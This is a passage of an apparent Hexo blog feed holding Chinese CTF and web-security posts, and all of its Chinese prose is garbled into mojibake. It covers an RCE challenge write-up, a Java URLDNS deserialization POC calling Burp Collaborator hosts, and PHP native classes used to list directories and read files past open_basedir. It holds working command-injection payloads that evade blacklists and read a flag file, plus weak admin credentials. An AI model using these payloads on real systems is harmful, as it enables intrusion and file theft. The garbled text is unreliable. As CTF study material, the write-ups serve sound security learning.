class="keyword">return</span> <span class="string">&quot;waf&quot;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;/source&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/source&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">source</span>():</span><br><span class="line">    src = <span class="built_in">open</span>(<span class="string">&quot;app.py&quot;</span>, <span class="string">&#x27;rb&#x27;</span>).read()</span><br><span class="line">    <span class="keyword">return</span> src</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, debug=<span class="literal">False</span>, port=<span class="number">8080</span>)</span><br></pre></td></tr></table></figure><p>é€»è¾‘ç®€å•ï¼Œä¼ å…¥ä¸€ä¸ªå‚æ•°ï¼Œåœ¨<code>os.popen()</code>å¤„æ‰§è¡Œå‘½ä»¤ï¼Œéš¾ç‚¹åœ¨äºç»•é»‘åå•ä»¥åŠ<code>os.popen()</code>æ— å›æ˜¾</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">black_list = <span class="string">&#x27;01233456789un/|&#123;&#125;*!;@#\n`~\&#x27;\&quot;&gt;&lt;=+-_ &#x27;</span></span><br></pre></td></tr></table></figure><p>å‰©ä¸‹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\t $ &amp; () , . : ? ä»¥åŠå¤§å°å†™å­—æ¯ï¼ˆé™¤u n)</span><br></pre></td></tr></table></figure><p><strong>payload</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?Å‡Å›Å›=cp$(cd..&amp;&amp;cd..&amp;&amp;cd..&amp;&amp;cd..&amp;&amp;cd..&amp;&amp;cd..&amp;&amp;cd..&amp;&amp;cd..&amp;&amp;echo$(pwd)flag)app.py</span><br></pre></td></tr></table></figure><p>3ä¸ªç‚¹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1.%09(tab)ä»£æ›¿ç©ºæ ¼</span><br><span class="line">2.echo$(pwd)è·å– /</span><br><span class="line">3.å°†flagå†…å®¹å¸¦åˆ°app.py</span><br></pre></td></tr></table></figure><p>å°†payload urlç¼–ç ä¸€ä¸‹ï¼Œè®¿é—®app.pyè·å¾—flag</p><h2 id="5-web-letmeguess-1"><a href="#5-web-letmeguess-1" class="headerlink" title="5_web_letmeguess_1"></a>5_web_letmeguess_1</h2><p>ç™»å½•å¼±å¯†ç </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">admin</span><br><span class="line">admin123</span><br></pre></td></tr></table></figure><p>è¿‡æ»¤è¯¸å¤šå…³é”®å­—</p><p>å…³é”®æ˜¯ç”¨%0a(æ¢è¡Œç¬¦)ï¼Œ%0d(å›è½¦ç¬¦)ç»•è¿‡<code>;</code>ï¼Œå…¶ä»–è¿‡æ»¤éƒ½å¥½ç»•</p><p><strong>payload</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?ip=%0dcd%09kyl*%0atac%09fla*</span><br></pre></td></tr></table></figure><h1 id="åè®°"><a href="#åè®°" class="headerlink" title="åè®°"></a>åè®°</h1><p>ç¬”è€…çš„æ€»ç»“åŸºæœ¬åˆ°è¿™é‡Œå°±ç»“æŸäº†ï¼Œå¦‚ä»Šctfçº¯ç²¹çš„rceé¢˜ç›®å·²ç»æ¯”è¾ƒå°‘äº†ï¼Œå¸¸è§çš„æ— å­—æ¯æ•°å­—ï¼Œæ— å‚æ•°ç­‰ç­‰å·²ç»è¢«ç©çƒ‚äº†ï¼Œèµ·åˆå†™è¿™ç¯‡æ–‡ç« åªæ˜¯æƒ³è®°å½•ä¸¤ä¸ªæ¯”è¾ƒæœ‰è¶£çš„phpè‡ªå¢è‡ªå‡é¢˜ç›®ï¼Œä¸çŸ¥ä¸è§‰å†™äº†é‚£ä¹ˆå¤šï¼Œç¬”è€…ç›¸ä¿¡è¿˜æœ‰å¾ˆå¤šrceçš„æ–¹å¼æœ‰å¾…æŒ–æ˜ã€‚</p><h1 id="å‚è€ƒï¼š"><a href="#å‚è€ƒï¼š" class="headerlink" title="å‚è€ƒï¼š"></a>å‚è€ƒï¼š</h1><p>1.<a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html">ä¸€äº›ä¸åŒ…å«æ•°å­—å’Œå­—æ¯çš„webshell | ç¦»åˆ«æ­Œ (leavesongs.com)</a></p><p>2.<a href="https://f5.pm/go-29700.html">æ— å­—æ¯æ•°å­—webshellæ€»ç»“</a></p><p>3.<a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html?page=2#reply-list">æ— å­—æ¯æ•°å­—webshellä¹‹æé«˜ç¯‡ | ç¦»åˆ«æ­Œ (leavesongs.com)</a></p><p>4.<a href="https://skysec.top/2019/03/29/PHP-Parametric-Function-RCE/">PHP Parametric Function RCE Â· skyâ€™s blog (skysec.top)</a></p>]]></content>
      
      
      <categories>
          
          <category> rce </category>
          
      </categories>
      
      
        <tags>
            
            <tag> å¥‡æŠ€æ·«å·§ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Javaå®‰å…¨ä¹‹è·¯--URLDNSé“¾</title>
      <link href="/2022/10/01/URLDNS%E9%93%BE/"/>
      <url>/2022/10/01/URLDNS%E9%93%BE/</url>
      
        <content type="html"><![CDATA[<h1 id="URLDNS"><a href="#URLDNS" class="headerlink" title="URLDNS"></a>URLDNS</h1><p><code>URLDNS</code>é“¾é€šå¸¸ç”¨äºæ£€æµ‹æ˜¯å¦å­˜åœ¨<code>Java</code>ååºåˆ—åŒ–æ¼æ´</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">URLDNSé“¾é€šè¿‡å‘èµ·DNSè¯·æ±‚ï¼Œæ£€æµ‹æ˜¯å¦å­˜åœ¨ååºåˆ—åŒ–æ¼æ´</span><br><span class="line">URLDNSé“¾ä¸é™åˆ¶jdkç‰ˆæœ¬ï¼Œé“¾å­ä¸­æ‰€ä½¿ç”¨çš„ç±»å‡ä¸ºJavaå†…ç½®ç±»</span><br></pre></td></tr></table></figure><h1 id="åˆ©ç”¨åˆ†æ"><a href="#åˆ©ç”¨åˆ†æ" class="headerlink" title="åˆ©ç”¨åˆ†æ"></a>åˆ©ç”¨åˆ†æ</h1><p><strong>gadget</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">HashMap.readObject()</span><br><span class="line">   HashMap.putVal()</span><br><span class="line">      HashMap.hash()</span><br><span class="line">         URL.hashCode()</span><br></pre></td></tr></table></figure><p>ä»<code>HashMap.readObject()</code>å…¥æ‰‹</p><p><a href="https://imgse.com/i/ppEPzUU"><img src="https://s1.ax1x.com/2023/03/04/ppEPzUU.png" alt="ppEPzUU.png"></a></p><p>è¿™é‡Œé€šè¿‡<code>for</code>å¾ªç¯å°†<code>HashMap</code>ä¸­å­˜å‚¨çš„<code>key</code>å’Œ<code>value</code>è¿›è¡Œååºåˆ—åŒ–ï¼Œç„¶åè°ƒç”¨<code>putVal()</code></p><p>è·Ÿè¿›ï¼Œ<code>putVal()</code>ä¸­åˆè°ƒç”¨äº†<code>hash()</code>å‡½æ•°</p><p><a href="https://imgse.com/i/ppEi8qP"><img src="https://s1.ax1x.com/2023/03/04/ppEi8qP.png" alt="ppEi8qP.png"></a></p><p>å¦‚æœkeyå€¼ä¸ä¸ºç©ºï¼Œåˆ™è°ƒç”¨<code>key.hashCode()</code></p><p>å¦‚æœä»¤keyä¸ºURLç±»ï¼Œå³å¯è°ƒç”¨åˆ°<code>URL.hashCode()</code>ä»¥å‘èµ·DNSè¯·æ±‚</p><p><strong>demo</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">POC</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        HashMap&lt;URL, Integer&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        hashMap.put(<span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;http://iseq4987tqunxpq388dq2ng8azgr4g.burpcollaborator.net&quot;</span>), <span class="number">1</span>);</span><br><span class="line">        serialize(hashMap);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object object)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">os</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fos);</span><br><span class="line">        os.writeObject(object);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ‰§è¡Œä»¥ä¸Šä»£ç ï¼Œå¯ä»¥å‘ç°åœ¨æ²¡æœ‰è¿›è¡Œååºåˆ—åŒ–æ—¶å°±æ¥æ”¶åˆ°äº†DNSè¯·æ±‚</p><p><a href="https://imgse.com/i/ppEnEqJ"><img src="https://s1.ax1x.com/2023/03/04/ppEnEqJ.png" alt="ppEnEqJ.png"></a></p><p>è¿™æ˜¯ä¸ºä»€ä¹ˆï¼Ÿ</p><p>é—®é¢˜å‡ºåœ¨putå‡½æ•°</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> V <span class="title function_">put</span><span class="params">(K key, V value)</span> &#123;</span><br><span class="line"><span class="keyword">return</span> putVal(hash(key), key, value, <span class="literal">false</span>, <span class="literal">true</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¯ä»¥å‘ç°åœ¨è¿›è¡Œ<code>hashMap.put</code>çš„æ—¶å€™å°±å·²ç»è°ƒç”¨äº†putVal()å’Œhash()å‡½æ•°ï¼Œæå‰å‘é€äº†DNSè¯·æ±‚</p><p>å¦ä¸€ä¸ªé—®é¢˜ï¼Œåœ¨URL.hashCodeéœ€è¦æ»¡è¶³<code>hashCode != -1</code>ï¼Œå¦åˆ™ä¸ä¼šå¾€ä¸‹æ‰§è¡Œ</p><p><img src="C:\Users\gh0st\AppData\Roaming\Typora\typora-user-images\image-20230304202923817.png" alt="image-20230304202923817"></p><p>è·Ÿè¿›<code>handler.hashCode()</code>ï¼Œæœ€ç»ˆå‘èµ·DNSè¯·æ±‚çš„æ˜¯<code>URLStreamHandler.hashCode()</code>ï¼Œé€šè¿‡getHostAddress()æ¥è¿›è¡ŒDNSè§£æè¿”å›å¯¹åº”çš„IP</p><p><a href="https://imgse.com/i/ppEnjSK"><img src="https://s1.ax1x.com/2023/03/04/ppEnjSK.png" alt="ppEnjSK.png"></a></p><p>æ‰€ä»¥éœ€è¦åœ¨å¼€å§‹æ—¶è®²hashCodeçš„å€¼æ”¹ä¸ºä¸æ˜¯-1ï¼Œé¿å…putæ—¶è¿›è¡ŒDNSè¯·æ±‚ï¼ŒåŒæ—¶åœ¨è¿›è¡Œåºåˆ—åŒ–ä¹‹å‰å°†hashCodeå€¼æ”¹ä¸º-1ï¼Œä¿è¯åœ¨ååºåˆ—åŒ–æ—¶å‘é€DNSè¯·æ±‚</p><p>é€šè¿‡åå°„ï¼Œå¯ä»¥è½»æ¾è§£å†³é—®é¢˜</p><p><strong>POC</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">POC</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        HashMap&lt;URL, Integer&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line"></span><br><span class="line">        <span class="type">URL</span> <span class="variable">url</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;http://1hj9tsxqi9j6m8fmxr29r65rzi5ct1.burpcollaborator.net&quot;</span>);</span><br><span class="line">        Class&lt;? <span class="keyword">extends</span> <span class="title class_">URL</span>&gt; c = url.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">hashCode</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;hashCode&quot;</span>);</span><br><span class="line">        hashCode.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        hashCode.set(url, <span class="number">222</span>);</span><br><span class="line"></span><br><span class="line">        hashMap.put(url, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        hashCode.set(url, -<span class="number">1</span>);</span><br><span class="line">        serialize(hashMap);</span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object object)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">os</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fos);</span><br><span class="line">        os.writeObject(object);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">FileInputStream</span> <span class="variable">fis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">oi</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(fis);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">object</span> <span class="operator">=</span> oi.readObject();</span><br><span class="line">        <span class="keyword">return</span> object;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><a href="https://imgse.com/i/ppEugne"><img src="https://s1.ax1x.com/2023/03/04/ppEugne.png" alt="ppEugne.png"></a></p>]]></content>
      
      
      <categories>
          
          <category> Javaå®‰å…¨ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>phpåŸç”Ÿç±»çš„åˆ©ç”¨</title>
      <link href="/2022/05/29/php%E5%8E%9F%E7%94%9F%E7%B1%BB/"/>
      <url>/2022/05/29/php%E5%8E%9F%E7%94%9F%E7%B1%BB/</url>
      
        <content type="html"><![CDATA[<h1 id="phpåŸç”Ÿç±»"><a href="#phpåŸç”Ÿç±»" class="headerlink" title="phpåŸç”Ÿç±»"></a><strong>phpåŸç”Ÿç±»</strong></h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">phpçš„å†…ç½®ç±»ï¼Œå³ä¸éœ€è¦åœ¨å½“å‰è„šæœ¬å†™å‡ºï¼Œä½†ä¹Ÿå¯ä»¥å®ä¾‹åŒ–çš„ç±»</span><br></pre></td></tr></table></figure><p>å¯é€šè¿‡ä¸€ä¸ªè„šæœ¬å¯»æ‰¾phpä¸­çš„åŸç”Ÿç±»</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$classes</span> = <span class="title function_ invoke__">get_declared_classes</span>();</span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$classes</span> <span class="keyword">as</span> <span class="variable">$class</span>) &#123;</span><br><span class="line">    <span class="variable">$methods</span> = <span class="title function_ invoke__">get_class_methods</span>(<span class="variable">$class</span>);</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$methods</span> <span class="keyword">as</span> <span class="variable">$method</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$method</span>, <span class="keyword">array</span>(</span><br><span class="line">            <span class="string">&#x27;__destruct&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__toString&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__wakeup&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__call&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__callStatic&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__get&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__set&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__isset&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__unset&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__invoke&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__set_state&#x27;</span></span><br><span class="line">        ))) &#123;</span><br><span class="line">            <span class="keyword">print</span> <span class="variable">$class</span> . <span class="string">&#x27;::&#x27;</span> . <span class="variable">$method</span> . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/002845eb7a1649d1905f6ac91932c21e.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>æ¯”èµ›ä¸­å¸¸ç”¨çš„æœ‰ä»¥ä¸‹å‡ ä¸ª</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Error</span><br><span class="line">Exception</span><br><span class="line">SoapClient</span><br><span class="line">DirectoryIterator</span><br><span class="line">Filesystemlterator</span><br><span class="line">SimpleXMLElement</span><br></pre></td></tr></table></figure><p>æŒ‰ç…§ç”¨é€”å¯åˆ†ä¸ºä»¥ä¸‹å‡ ä¸ª</p><h2 id="éå†ç›®å½•"><a href="#éå†ç›®å½•" class="headerlink" title="éå†ç›®å½•"></a>éå†ç›®å½•</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">DirectoryIterator ç±»</span><br><span class="line">FilesystemIterator ç±»</span><br><span class="line">GlobIterator ç±»</span><br></pre></td></tr></table></figure><p>æŸ¥é˜…å®˜æ–¹æ–‡æ¡£ï¼Œå¯ä»¥å‘ç°</p><p><img src="https://cdn.jsdelivr.net/gh/gh0st-9/images@main/image/202210041004050.png" alt="image-20221004100450009"></p><p><strong>FilesystemIterator</strong>æ˜¯<strong>DirectoryIterator</strong>çš„å­ç±»</p><p>åœ¨DirectoryIteratorä¸‹æœ‰__toString()æ–¹æ³•</p><p><img src="https://cdn.jsdelivr.net/gh/gh0st-9/images@main/image/202210041051216.png" alt="image-20221004105120134"></p><p><strong>demo</strong></p><p>è¿™æ ·ä¼šè§¦å‘__toString() æ–¹æ³•ï¼Œè¾“å‡ºæ ¹ç›®å½•ä¸‹çš„ç¬¬ä¸€ä¸ªæ–‡ä»¶å</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$dirname</span> = <span class="keyword">new</span> <span class="built_in">DirectoryIterator</span>(<span class="string">&quot;/&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$dirname</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//$RECYCLE.BIN</span></span><br></pre></td></tr></table></figure><p>é€šè¿‡foreachè¿›è¡Œå¾ªç¯éå†å¯è¾“å‡ºæŒ‡å®šç›®å½•ä¸‹æ‰€æœ‰æ–‡ä»¶å</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$dirname</span> = <span class="keyword">new</span> <span class="built_in">DirectoryIterator</span>(<span class="string">&quot;/&quot;</span>);</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$dirname</span> <span class="keyword">as</span> <span class="variable">$a</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span>(<span class="variable">$a</span>-&gt;<span class="title function_ invoke__">__toString</span>().<span class="string">&#x27;&lt;br&gt;&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/gh0st-9/images@main/image/202210041053346.png" alt="image-20221004105355269"></p><p>å¯ä»¥åœ¨æœ¬åœ°å†å°å°æµ‹è¯•ä¸‹</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(__file__);</span><br><span class="line"><span class="variable">$shell</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;shell&#x27;</span>];</span><br><span class="line"><span class="variable">$dir</span> = <span class="keyword">new</span> <span class="built_in">DirectoryIterator</span>(<span class="variable">$shell</span>);</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$dir</span> <span class="keyword">as</span> <span class="variable">$f</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span>(<span class="variable">$f</span>-&gt;<span class="title function_ invoke__">__toString</span>().<span class="string">&#x27;&lt;br&gt;&#x27;</span>); <span class="comment">//ä¸åŠ __toString()ä¹Ÿå¯,å› ä¸ºechoæ—¶ä¼šè‡ªåŠ¨è°ƒç”¨</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/gh0st-9/images@main/image/202210041055870.png" alt="image-20221004105540790"></p><p>å¯ä»¥åŠ ä¸Šå’Œglobåè®®çš„ä½¿ç”¨ï¼Œå¯ä»¥æ›´å¿«é€Ÿç²¾å‡†çš„æŸ¥æ‰¾</p><p>æŸ¥æ‰¾æ‰€æœ‰txtæ–‡ä»¶</p><p><img src="https://cdn.jsdelivr.net/gh/gh0st-9/images@main/image/202210041058300.png" alt="image-20221004105822213"></p><p><strong>FilesystemIterator</strong>ç”¨æ³•å’ŒDirectoryIteratorä¸€æ ·</p><p><strong>GlobIterator</strong>ç±»ä¸å‰ä¸¤ä¸ªç±»çš„ç”¨æ³•ä¹Ÿç›¸ä¼¼ï¼Œåªæ˜¯GlobIterator ç±»æ”¯æŒç›´æ¥é€šè¿‡æ¨¡å¼åŒ¹é…æ¥å¯»æ‰¾æ–‡ä»¶è·¯å¾„ï¼Œç›¸å½“äºè‡ªèº«å¸¦æœ‰globåè®®</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$dir</span> = <span class="keyword">new</span> <span class="built_in">GlobIterator</span>(<span class="string">&quot;/*txt*&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$dir</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//1.txt</span></span><br></pre></td></tr></table></figure><p>è¿™ä¸‰ç§éå†ç›®å½•çš„æ–¹æ³•å¯ä»¥æ— è§†<strong>open_basedir</strong>å¯¹ç›®å½•çš„é™åˆ¶</p><h2 id="è¯»å–æ–‡ä»¶"><a href="#è¯»å–æ–‡ä»¶" class="headerlink" title="è¯»å–æ–‡ä»¶"></a>è¯»å–æ–‡ä»¶</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SplFileObject ç±»</span><br></pre></td></tr></table></figure><p>è¯¥ç±»çš„æ„é€ æ–¹æ³•å¯ä»¥æ„é€ ä¸€ä¸ªæ–°çš„æ–‡ä»¶å¯¹è±¡ç”¨äºåç»­çš„è¯»å–ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(__file__);</span><br><span class="line"><span class="variable">$context</span> = <span class="keyword">new</span> <span class="built_in">SplFileObject</span>(<span class="string">&#x27;/1.txt&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$context</span>;</span><br></pre></td></tr></table></figure><p>ä½†æ¯æ¬¡åªèƒ½è¯»å–æ–‡ä»¶ä¸­çš„ä¸€è¡Œå†…å®¹</p><p><img src="https://cdn.jsdelivr.net/gh/gh0st-9/images@main/image/202210041103402.png" alt="image-20221004110313338"></p><p>åŒæ ·é€šè¿‡éå†å¯ä»¥è¯»å–æ‰€æœ‰å†…å®¹</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$context</span> = <span class="keyword">new</span> <span class="built_in">SplFileObject</span>(<span class="string">&#x27;/1.txt&#x27;</span>);</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$context</span> <span 